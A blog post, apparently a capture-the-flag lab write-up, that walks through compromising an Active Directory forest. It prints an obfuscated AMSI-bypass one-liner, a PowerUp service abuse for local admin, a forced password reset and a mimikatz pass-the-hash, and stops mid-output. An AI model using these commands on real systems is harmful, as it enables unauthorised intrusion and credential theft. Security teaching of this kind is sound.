<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="cosmos, part 1: red-teaming corporate active directory forests">

    
        <title>cosmos, part 1: red-teaming corporate active directory forests | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.6f40ec7b8baa6b4858deb6d2433606e0c74c60aa022d42f0d84457862cc005f3.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    cosmos, part 1: red-teaming corporate active directory forests
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 19, 2024 &nbsp;&nbsp; m. jan 19, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction"><strong>introduction</strong></a></li>
    <li><a href="#scenario"><strong>scenario</strong></a></li>
  </ul>

  <ul>
    <li><a href="#the-machines">the machines</a>
      <ul>
        <li><a href="#usernebulacosmoslocal"><code>User.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#uatsrvnebulacosmoslocal"><code>Uatsrv.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#devsrvnebulacosmoslocal"><code>Devsrv.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#prodsrvnebulacosmoslocal"><code>Prodsrv.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#nebula-dcnebulacosmoslocal"><code>Nebula-DC.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#cosmos-dccosmoslocal"><code>Cosmos-DC.Cosmos.Local</code></a></li>
      </ul>
    </li>
    <li><a href="#attack-path">attack path</a></li>
  </ul>

  <ul>
    <li><a href="#initial-access--privilege-escalation">initial access + privilege escalation</a></li>
    <li><a href="#enumeration">enumeration</a></li>
  </ul>
</nav>
</aside>


<main><h2 id="introduction"><strong>introduction</strong></h2>
<p>corporate networks face a constant and ever-evolving array of threats. at the heart of many enterprise IT infrastructures lies Active Directory [AD]. this is a directory service developed by Microsoft that provides authentication (AuthC) and authorization (AuthZ) services. AD is ubiquitous because of its robust capabilities in managing users, groups, computers, and access to resources across large-scale networks.</p>
<p>this also makes it a prime target for attackers. a successful attack on an org&rsquo;s AD can lead to data breaches, intellectual property theft, or complete takeover of the corporate infrastructure.</p>
<p>red-teaming involves simulating real-world attacks on an org&rsquo;s systems + networks. for AD environments, this means compromising user accounts, escalating privileges, moving laterally through the network, and ultimately gaining control over domain controllers. by emulating TTPs of actual threat actors, red-teaming helps orgs identify vulnerabilities, test detection + response, and strengthen their security posture.</p>
<p>corporate AD environments are typically set up in a hierarchical structure, often spanning multiple domains and forests to reflect the org-structure of the business. this complexity, while necessary for large enterprises, can introduce vulnerabilities if not properly managed. misconfigurations, overly permissive settings, or failures to follow principles of least privilege can create opportunities for attackers to exploit.</p>
<p>the real kicker is that because AD has an interconnected nature, a compromise in one part of the network can potentially lead to a full domain (or even forest) takeover.</p>
<h2 id="scenario"><strong>scenario</strong></h2>
<p>the scenario here focuses on an on-prem AD environment. many organizations are now moving towards a fully cloud-based (or hybrid) environment, but on-prem AD remains prevalent in numerous enterprises due to regulatory requirements, legacy system dependencies, or specific business needs.</p>
<p>how would an attacker in this scenario gain their initial foothold? there are several ways in:</p>
<p><strong>phishing attacks</strong>: tricking employees into revealing credentials or executing malware.</p>
<p><strong>social engineering</strong>: manipulating employees to divulge sensitive information.</p>
<p><strong>exploiting external services</strong>: leveraging vulnerabilities in web apps, VPNs, or other services exposed to the internet.</p>
<p><strong>purchasing stolen credentials</strong>: gg ez.</p>
<p>in this CTF, everyone already starts with access to a user account, thereby circumventing the initial breach step. this means i can focus solely on the post-exploitation phase: escalate privileges and move laterally.</p>
<p>the attack chain demonstrates how a minor foothold can be leveraged to compromise an entire AD forest. hopefully, by sharing and understanding these attack paths, the security community can learn to better defend against them.</p>
<h1 id="the-forest">the forest</h1>
<p>the target environment is set up as an AD forest named <code>Cosmos.Local</code>. a forest is the highest level of organization in AD and can contain one or more domains.</p>
<p>in this case, we have two domains:</p>
<p><strong><code>Cosmos.Local</code></strong>: the parent domain.</p>
<p><strong><code>Nebula.Cosmos.Local</code></strong>: the child domain.</p>
<p>these domains are connected by a two-way trust relationship, also known as a &ldquo;parent-child trust&rdquo;. what this means is that the users from one domain can be granted access to resources in the other domain, and vice versa. these trust relationships are common in large orgs where different departments or subsidiaries need their own AD domains but still require a level of integration.</p>
<h2 id="the-machines">the machines</h2>
<h3 id="usernebulacosmoslocal"><code>User.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: end-user workstation (typical employee computer). initial point of entry which simulates a compromised user account.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="uatsrvnebulacosmoslocal"><code>Uatsrv.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: UAT (User Acceptance Testing) Server. used for testing apps before they go into production. often has elevated privileges and looser security controls.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="devsrvnebulacosmoslocal"><code>Devsrv.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: development server. hosts dev environments + tools. may contain valuable source code and often has connections to other critical systems.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="prodsrvnebulacosmoslocal"><code>Prodsrv.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: production server. runs live business apps. critical asset with access to real data and often stringent security measures.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="nebula-dcnebulacosmoslocal"><code>Nebula-DC.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: DC for <code>Nebula.Cosmos.Local</code>. manages AuthC + AuthZ for the Nebula child domain. prime target for attackers looking to control the entire child domain.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="cosmos-dccosmoslocal"><code>Cosmos-DC.Cosmos.Local</code></h3>
<p><strong>role</strong>: DC for <code>Cosmos.Local</code> [Forest Root]. this is the ultimate target. as the forest root domain controller, it has authority over all domains in the forest. <strong>compromising this grants control over the entire AD infrastructure.</strong></p>
<h2 id="attack-path">attack path</h2>
<p>gain a foothold on the user workstation.</p>
<p>then, move laterally to the UAT and Dev servers, exploiting their looser security.</p>
<p>next, leverage access to compromise the production server.</p>
<p>abuse the production server&rsquo;s privileges to attack the <code>Nebula</code> domain controller.</p>
<p>finally, exploit the trust relationship to compromise the <code>Cosmos</code> domain controller and the entire forest.</p>
<h1 id="target-1-the-foothold">target 1: the foothold</h1>
<p>the seemingly innocuous user workstation is the entry point into the network. in a typical enterprise environment, these workstations are the most numerous and often considered low-hanging fruit for attackers. employees use them for daily tasks and so they&rsquo;re often less strictly controlled than servers.</p>
<p>the challenge is to elevate privileges and gather crucial information about the domain structure&hellip;without raising any alarms.</p>
<p>another thing about workstations: they often have vulnerabilities, outdated software, and misconfigurations. they can also be treasure troves of information, like cached credentials.</p>
<h2 id="initial-access--privilege-escalation">initial access + privilege escalation</h2>
<p>first, let&rsquo;s disable AMSI (Antimalware Scan Interface). AMSI is designed to prevent malicious scripts from running, so i&rsquo;ll have to write an obfuscated command to evade detection by signature-based security tools.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; sET-ItEM <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#39;V&#39;</span>+<span style="color:#f1fa8c">&#39;aR&#39;</span> + <span style="color:#f1fa8c">&#39;IA&#39;</span> + <span style="color:#f1fa8c">&#39;blE:1q2&#39;</span> + <span style="color:#f1fa8c">&#39;uZx&#39;</span> <span style="color:#ff79c6">)</span> <span style="color:#ff79c6">(</span> <span style="color:#ff79c6">[</span>TYpE<span style="color:#ff79c6">](</span><span style="color:#f1fa8c">&#34;{1}{0}&#34;</span>-F<span style="color:#f1fa8c">&#39;F&#39;</span>,<span style="color:#f1fa8c">&#39;rE&#39;</span> <span style="color:#ff79c6">)</span> <span style="color:#ff79c6">)</span> ; <span style="color:#ff79c6">(</span> GeT-VariaBle <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#34;1Q2U&#34;</span> +<span style="color:#f1fa8c">&#34;zX&#34;</span> <span style="color:#ff79c6">)</span> -VaL <span style="color:#ff79c6">)</span>.<span style="color:#f1fa8c">&#34;A`ss`Embly&#34;</span>.<span style="color:#f1fa8c">&#34;GET`TY`Pe&#34;</span><span style="color:#ff79c6">((</span> <span style="color:#f1fa8c">&#34;{6}{3}{1}{4}{2}{0}{5}&#34;</span> -f<span style="color:#f1fa8c">&#39;Util&#39;</span>,<span style="color:#f1fa8c">&#39;A&#39;</span>,<span style="color:#f1fa8c">&#39;Amsi&#39;</span>,<span style="color:#f1fa8c">&#39;.Management.&#39;</span>,<span style="color:#f1fa8c">&#39;utomation.&#39;</span>,<span style="color:#f1fa8c">&#39;s&#39;</span>,<span style="color:#f1fa8c">&#39;System&#39;</span> <span style="color:#ff79c6">))</span>.<span style="color:#f1fa8c">&#34;g`etf`iElD&#34;</span><span style="color:#ff79c6">(</span> <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#34;{0}{2}{1}&#34;</span> -f<span style="color:#f1fa8c">&#39;amsi&#39;</span>,<span style="color:#f1fa8c">&#39;d&#39;</span>,<span style="color:#f1fa8c">&#39;InitFaile&#39;</span> <span style="color:#ff79c6">)</span>,<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;{2}{4}{0}{1}{3}&#34;</span> -f <span style="color:#f1fa8c">&#39;Stat&#39;</span>,<span style="color:#f1fa8c">&#39;i&#39;</span>,<span style="color:#f1fa8c">&#39;NonPubli&#39;</span>,<span style="color:#f1fa8c">&#39;c&#39;</span>,<span style="color:#f1fa8c">&#39;c,&#39;</span> <span style="color:#ff79c6">))</span>.<span style="color:#f1fa8c">&#34;sE`T`VaLUE&#34;</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">n</span><span style="color:#f1fa8c">`</span>ULl<span style="color:#ff79c6">}</span>,<span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">t</span><span style="color:#f1fa8c">`</span>RuE<span style="color:#ff79c6">}</span> <span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>now i can run my own tools without interference.</p>
<p>next, let&rsquo;s change the execution policy.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Powershell -ep bypass
</span></span></code></pre></div><p>this launches PowerShell with the execution policy set to <code>bypass</code>. the execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files + runs scripts. by bypassing it, scripts can be run without restrictions.</p>
<p>i then used <code>PowerUp</code> to find vectors of privilege escalation. using it along with <code>Invoke-AllChecks</code> runs a series of checks to identify vectors like misconfigurations, vulnerable services, or unquoted service paths.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; .<span style="color:#f1fa8c">\P</span>owerUp.ps1
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Invoke-AllChecks
</span></span></code></pre></div><p>i get back an interesting piece of information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ServiceName : vds
</span></span><span style="display:flex;"><span>Path : C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\v</span>ds.exe
</span></span><span style="display:flex;"><span>StartName : LocalSystem
</span></span><span style="display:flex;"><span>AbuseFunction : Invoke-ServiceAbuse -Name <span style="color:#f1fa8c">&#39;vds&#39;</span>
</span></span><span style="display:flex;"><span>CanRestart : True
</span></span></code></pre></div><p>let&rsquo;s exploit this vulnerable service <code>VDS</code> to add our user <code>bilal</code> to the local Administrators group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Invoke-ServiceAbuse -ServiceName vds -UserName Nebula<span style="color:#f1fa8c">\b</span>ilal
</span></span></code></pre></div><p>this exploits a vulnerability in <code>VDS</code> (Virtual Disk Service). it modifies the service to run a command [<code>net localgroup Administrators Nebula\bilal /add</code>] that will add my user to the Administrators group. this works because <code>VDS</code> runs with <code>SYSTEM</code> privileges.</p>
<p>logging back in so the changes take effect, i can verify:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; net localgroup Administrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------------------------
</span></span><span style="display:flex;"><span>Administrator
</span></span><span style="display:flex;"><span>Nebula<span style="color:#f1fa8c">\D</span>omain Admins
</span></span><span style="display:flex;"><span>Nebula<span style="color:#f1fa8c">\b</span>ilal
</span></span></code></pre></div><h2 id="enumeration">enumeration</h2>
<p>get the list of domain users.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-NetUser | <span style="color:#ff79c6">select</span> samaccountname
</span></span></code></pre></div><p>get the list of domain computers.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-netcomputer
</span></span></code></pre></div><p>get the list of domain groups.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-netgroup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Administrators
</span></span><span style="display:flex;"><span>Users
</span></span><span style="display:flex;"><span>Guests
</span></span><span style="display:flex;"><span>Print Operators
</span></span><span style="display:flex;"><span>Backup Operators
</span></span><span style="display:flex;"><span>Replicator
</span></span><span style="display:flex;"><span>Remote Desktop Users
</span></span><span style="display:flex;"><span>Network Configuration Operators
</span></span><span style="display:flex;"><span>Performance Monitor Users
</span></span><span style="display:flex;"><span>Performance Log Users
</span></span><span style="display:flex;"><span>Distributed COM Users
</span></span><span style="display:flex;"><span>IIS_IUSRS
</span></span><span style="display:flex;"><span>Cryptographic Operators
</span></span><span style="display:flex;"><span>Event Log Readers
</span></span><span style="display:flex;"><span>Certificate Service DCOM Access
</span></span><span style="display:flex;"><span>RDS Remote Access Servers
</span></span><span style="display:flex;"><span>RDS Endpoint Servers
</span></span><span style="display:flex;"><span>RDS Management Servers
</span></span><span style="display:flex;"><span>Hyper-V Administrators
</span></span><span style="display:flex;"><span>Access Control Assistance Operators
</span></span><span style="display:flex;"><span>Remote Management Users
</span></span><span style="display:flex;"><span>System Managed Accounts Group
</span></span><span style="display:flex;"><span>Storage Replica Administrators
</span></span><span style="display:flex;"><span>Domain Computers
</span></span><span style="display:flex;"><span>Domain Controllers
</span></span><span style="display:flex;"><span>Cert Publishers
</span></span><span style="display:flex;"><span>Domain Admins
</span></span><span style="display:flex;"><span>Domain Users
</span></span><span style="display:flex;"><span>Domain Guests
</span></span><span style="display:flex;"><span>Group Policy Creator Owners
</span></span><span style="display:flex;"><span>RAS and IAS Servers
</span></span><span style="display:flex;"><span>Server Operators
</span></span><span style="display:flex;"><span>Account Operators
</span></span><span style="display:flex;"><span>Pre-Windows <span style="color:#bd93f9">2000</span> Compatible Access
</span></span><span style="display:flex;"><span>Windows Authorization Access Group
</span></span><span style="display:flex;"><span>Terminal Server License Servers
</span></span><span style="display:flex;"><span>Allowed RODC Password Replication Group
</span></span><span style="display:flex;"><span>Denied RODC Password Replication Group
</span></span><span style="display:flex;"><span>Read-only Domain Controllers
</span></span><span style="display:flex;"><span>Cloneable Domain Controllers
</span></span><span style="display:flex;"><span>Protected Users
</span></span><span style="display:flex;"><span>Key Admins
</span></span><span style="display:flex;"><span>DnsAdmins
</span></span><span style="display:flex;"><span>DnsUpdateProxy
</span></span><span style="display:flex;"><span>SQLManagers
</span></span></code></pre></div><p>check domain trusts.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-NetDomainTrust
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SourceName               TargetName    TrustType     TrustDirection
</span></span><span style="display:flex;"><span>-----------              -----------   ----------    ---------------
</span></span><span style="display:flex;"><span>Nebula.Cosmos.Local      Cosmos.Local  ParentChild   Bidirectional
</span></span></code></pre></div><p>before moving on, it&rsquo;s important to run <code>nslookup</code> on each machine in the environment to collect their IP addresses. it&rsquo;s also helpful to map out a graphical representation of the AD relationships, using BloodHound.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  <span style="color:#8be9fd;font-style:italic">cd</span> .<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master&gt; <span style="color:#8be9fd;font-style:italic">cd</span> .<span style="color:#f1fa8c">\I</span>ngestors<span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors&gt; . .<span style="color:#f1fa8c">\S</span>harpHound.ps1
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors&gt; Invoke-BloodHound -CollectionMethod All
</span></span><span style="display:flex;"><span>Initializing SharpHound at 10:49 PM on 7/3/2024
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Creating Schema map <span style="color:#ff79c6">for</span> domain NEBULA.COSMOS.LOCAL using path <span style="color:#8be9fd;font-style:italic">CN</span><span style="color:#ff79c6">=</span>Schema,CN<span style="color:#ff79c6">=</span>Configuration,DC<span style="color:#ff79c6">=</span>NEBULA,DC<span style="color:#ff79c6">=</span>COSMOS,DC<span style="color:#ff79c6">=</span>LOCAL
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors&gt; Invoke-BloodHound -CollectionMethod LoggedOn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Initializing SharpHound at 10:49 PM on 7/3/2024
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Status: <span style="color:#bd93f9">68</span> objects finished <span style="color:#ff79c6">(</span>+68 68<span style="color:#ff79c6">)</span>/s -- Using <span style="color:#bd93f9">103</span> MB RAM
</span></span><span style="display:flex;"><span>Resolved Collection Methods: LoggedOn451
</span></span><span style="display:flex;"><span>Compressing data to C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors<span style="color:#f1fa8c">\2</span>0210703224909_BloodHound.zip
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Creating Schema map <span style="color:#ff79c6">for</span> domain NEBULA.COSMOS.LOCAL using path <span style="color:#8be9fd;font-style:italic">CN</span><span style="color:#ff79c6">=</span>Schema,CN<span style="color:#ff79c6">=</span>Configuration,DC<span style="color:#ff79c6">=</span>NEBULA,DC<span style="color:#ff79c6">=</span>COSMOS,DC<span style="color:#ff79c6">=</span>LOCAL
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors&gt; <span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> Cache File Found! Loaded <span style="color:#bd93f9">119</span> Objects in cache
</span></span><span style="display:flex;"><span>SharpHound Enumeration Completed at 10:49 PM on 7/3/2024! Happy Graphing!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Pre-populating Domain Controller SIDS
</span></span><span style="display:flex;"><span>Status: <span style="color:#bd93f9">0</span> objects finished <span style="color:#ff79c6">(</span>+0<span style="color:#ff79c6">)</span> -- Using <span style="color:#bd93f9">104</span> MB RAM
</span></span><span style="display:flex;"><span>Status: <span style="color:#bd93f9">5</span> objects finished <span style="color:#ff79c6">(</span>+5 â<span style="color:#ff79c6">)</span>/s -- Using <span style="color:#bd93f9">105</span> MB RAM
</span></span><span style="display:flex;"><span>Enumeration finished in 00:00:00.1406833
</span></span><span style="display:flex;"><span>Compressing data to C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors<span style="color:#f1fa8c">\2</span>0210703224919_BloodHound.zip
</span></span><span style="display:flex;"><span>You can upload this file directly to the UI
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SharpHound Enumeration Completed at 10:49 PM on 7/3/2024! Happy Graphing!
</span></span></code></pre></div><p>the <code>All</code> collection method would gather comprehensive data about the domain, while the <code>LoggedOn</code> method focuses on currently active sessions.</p>
<h1 id="target-2-leveraging-password-resets">target 2: leveraging password resets</h1>
<p>this machine represents a typical UAT server in an enterprise environment. UAT servers are used to test apps in an environment that closely mimic production, allowing users to verify that the software meets requirements before going live.</p>
<p>these servers often have looser security controls (compared to production systems). the challenge here is to exploit the delicate balance between functionality + security that UAT environments often struggle with.</p>
<p>it&rsquo;s clear that UAT servers are critical in the SDLC, but they&rsquo;re often overlooked from a security perspective. they may have elevated privileges to simulate various user roles, and their configurations might be less stringent to facilitate testing. this makes them valuable stepping stones for an attacker moving through a network.</p>
<p>earlier, running BloodHound revealed that the <code>bilal</code> user could force a password change for the <code>UATADMIN</code> user. let&rsquo;s exploit this using PowerView.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  Set-DomainUserPassword -Identity UATADMIN -Verbose
</span></span><span style="display:flex;"><span>cmdlet Set-DomainUserPassword at <span style="color:#8be9fd;font-style:italic">command</span> pipeline position <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>Supply values <span style="color:#ff79c6">for</span> the following parameters:
</span></span><span style="display:flex;"><span>AccountPassword: ********
</span></span><span style="display:flex;"><span>VERBOSE: <span style="color:#ff79c6">[</span>Set-DomainUserPassword<span style="color:#ff79c6">]</span> Attempting to <span style="color:#8be9fd;font-style:italic">set</span> the password <span style="color:#ff79c6">for</span> user <span style="color:#f1fa8c">&#39;UATADMIN&#39;</span>
</span></span><span style="display:flex;"><span>VERBOSE: <span style="color:#ff79c6">[</span>Set-DomainUserPassword<span style="color:#ff79c6">]</span> Password <span style="color:#ff79c6">for</span> user <span style="color:#f1fa8c">&#39;UATADMIN&#39;</span> successfully reset
</span></span></code></pre></div><p>this PowerView command allows me to forcibly change the password of another user&rsquo;s account. usually, this ability rests with IT for support purposes but can be a significant risk if not properly controlled. by changing the password, i can gain access to a more privileged account.</p>
<p>using mimikatz, i can perform an overpass-the-hash attack. this is when an attacker isn&rsquo;t able to access the cleartext password of a target, but can acquire a Kerberos ticket armed with just the NTLM hash of the password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#34;sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.1.1 <span style="color:#ff79c6">(</span>x64<span style="color:#ff79c6">)</span> built on Nov <span style="color:#bd93f9">29</span> <span style="color:#bd93f9">2018</span> 12:37:56
</span></span><span style="display:flex;"><span> .## ^ <span style="color:#6272a4">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo) ** Kitten Edition **</span>
</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#ff79c6">(</span> vincent.letoux@gmail.com <span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#39;#####&#39;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz<span style="color:#ff79c6">(</span>powershell<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe</span>
</span></span><span style="display:flex;"><span>user    : uatadmin
</span></span><span style="display:flex;"><span>domain  : nebula.cosmos.local
</span></span><span style="display:flex;"><span>program : powershell.exe
</span></span><span style="display:flex;"><span>impers. : no
</span></span><span style="display:flex;"><span>NTLM    : 271b74be505cd48cef768d0d973e59e7
